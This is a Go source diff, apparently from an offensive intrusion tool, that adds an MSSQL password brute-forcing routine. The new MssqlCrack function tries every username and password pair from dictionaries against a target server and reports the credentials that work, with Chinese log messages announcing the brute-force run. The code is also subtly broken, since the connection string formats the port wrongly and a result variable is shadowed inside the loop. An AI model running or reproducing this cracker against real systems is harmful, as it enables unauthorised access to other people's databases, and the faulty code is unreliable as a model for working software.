@@ -4,42 +4,44 @@ import (
 	"database/sql"
 	"fmt"
 	_ "github.com/denisenkom/go-mssqldb"
-	"time"
+	"os"
+	"strings"
 )
 
 var (
-	isdebug  = true
-	user     = "sa"
 	database = "master"
 )
 
-func MssqlConnect(Rhost string, Rport string, pwd string) (err error, db *sql.DB) {
+func MssqlConnect(Rhost string, Rport string, Ruser string, pwd string) (err error, db *sql.DB, sign bool) {
+	connString := fmt.Sprintf("server=%s;port%d;database=%s;user id=%s;password=%s", Rhost, Rport, database, Ruser, pwd)
 
-	_, err = WrapperTcpWithTimeout("tcp", Socks5Proxy, time.Second*10)
-	defer func() {
-		if conn != nil {
-			conn.Close()
-		}
-	}()
-	if err != nil {
-		Err(err)
-	}
-
-	var password = pwd
-	var server = Rhost
-	var port = Rport
-
-	connString := fmt.Sprintf("server=%s;port%d;database=%s;user id=%s;password=%s", server, port, database, user, password)
-	if isdebug {
-		Info(connString)
-	}
 	conn, err := sql.Open("mssql", connString)
 	if err != nil {
-		Err(err)
-	} else {
-		MssqlCMD("select @@version;", conn)
-		Success("连接成功!")
+		return nil, nil, false
 	}
 
-	return err, conn
+	err = conn.Ping()
+	if err != nil {
+		return nil, nil, false
+	}
+	sign = true
+
+	return err, conn, sign
+}
+
+func MssqlCrack(Rhost string, Rport string) {
+	Info("开始爆破,请稍等.....")
+	sign = false
+	for _, user := range Userdict["mssql"] {
+		for _, pass := range Passwords {
+			pass = strings.Replace(pass, "{user}", user, -1)
+			_, _, sign := MssqlConnect(Rhost, Rport, user, pass)
+			if sign == true {
+				Success(fmt.Sprintf("账号密码为：%s:%s", user, pass))
+				os.Exit(0)
+			} else {
+				fmt.Println(fmt.Sprintf("%s:%s 未成功爆破出账号密码", user, pass))
+			}
+		}
+	}
 }
